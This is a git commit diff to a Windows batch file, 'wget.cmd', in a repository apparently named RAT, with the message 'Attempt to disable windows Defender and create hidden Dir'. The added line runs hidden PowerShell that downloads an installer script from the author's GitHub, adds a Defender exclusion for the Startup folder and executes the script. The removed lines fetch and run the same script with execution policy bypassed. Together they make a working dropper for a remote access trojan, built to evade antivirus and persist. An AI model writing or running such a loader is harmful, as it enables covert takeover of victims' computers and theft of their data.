dc9d621007411d4a6040ffaf80a5f249c4f9c368
lukeeeeeee335 <lukeeeeeee334@gmail.com>
2026-01-25 16:39:21 +0000

    Attempt to disable windows Defender and create hidden Dir

--- files/wget.cmd
+++ files/wget.cmd
@@ -30,6 +30,5 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 REM Rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/Installer.ps1 -OutFile Installer.ps1"
-powershell -ep bypass -c "./Installer.ps1"
-pause
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/Installer.ps1 -OutFile Installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; ./Installer.ps1
+
